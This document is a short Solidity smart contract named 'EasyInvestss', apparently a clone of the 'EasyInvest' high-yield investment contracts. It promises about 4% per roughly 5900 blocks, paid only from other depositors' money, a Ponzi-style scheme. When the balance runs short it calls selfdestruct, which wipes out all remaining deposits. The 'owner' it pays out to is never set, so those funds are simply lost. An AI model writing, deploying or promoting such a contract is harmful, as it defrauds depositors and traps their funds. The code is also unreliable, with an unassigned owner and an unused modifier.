pragma solidity ^0.4.24;
contract EasyInvestss {
    mapping (address => uint256) invested;
    mapping (address => uint256) atBlock;
address public owner;
modifier onlyOwner() {
        require (msg.sender == owner);
        _;
    }
    function () external payable {
        if (invested[msg.sender] != 0) {
            uint256 blocksPassed = block.number - atBlock[msg.sender];
            uint256 amount = invested[msg.sender] * 4 * blocksPassed / 100 / 5900;
            
            if (address(this).balance < amount) {
                selfdestruct(owner);
                return;
            }
            
            if (amount > 0) {
                msg.sender.transfer(amount);
            }
        }
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}